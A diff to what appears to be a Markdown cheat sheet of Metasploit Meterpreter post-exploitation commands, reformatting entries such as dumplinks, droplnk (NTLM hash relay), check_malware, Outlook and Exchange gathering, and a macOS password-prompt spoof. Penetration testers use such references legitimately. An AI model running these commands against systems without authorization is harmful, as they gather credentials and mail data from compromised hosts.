@@ -8,8 +8,6 @@ run post/windows/manage/powershell/load_script
 
 run post/windows/manage/powershell/build_net_code
 
-
-
 run post/windows/gather/memory_grep (find specific strings in the process ID)
 
 run post/windows/gather/outlook (https://github.com/rapid7/metasploit-framework/blob/master/data/post/powershell/outlook.ps1)
@@ -18,19 +16,30 @@ run post/windows/gather/exchange (https://github.com/rapid7/metasploit-framework
 
 =========
 
-run dumplinks (dump shortcut lnk files)
+```
+meterpreter > run post/windows/gather/dumplinks (dump shortcut lnk files)
 
-run post/windows/gather/dumplinks (dump shortcut lnk files) && https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/gather/dumplinks.md
-
+https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/gather/dumplinks.md
+```
 =========
 
-run post/windows/escalate/droplnk
+```
+meterpreter > run post/windows/escalate/droplnk (NTLM hash relay)
+```
 
+```
+msf > use post/multi/gather/check_malware
 
+set apikey <virustotal_api_key>
 
-run post/windows/gather/enum_artifacts (detect malware)
+set session <session_ID>
 
-run post/multi/gather/check_malware
+set remotefile <drive_letter>:\\path\\to\\remote\\artifact.exe
+
+set remotefile /path/to/remote/artifact
+
+run
+```
 
 ======================
 
@@ -481,6 +490,10 @@ run post/osx/gather/password_prompt_spoof
 
 ## Others
 
+```
+meterpreter > run netenum
+```
+
 run domain_list_gen
 
 run duplicate
@@ -492,7 +505,5 @@ run enum_vmware
 run event_manager
 
 run scraper
-
-
 
 https://www.hackers-arise.com/ultimate-list-of-meterpreter-scripts
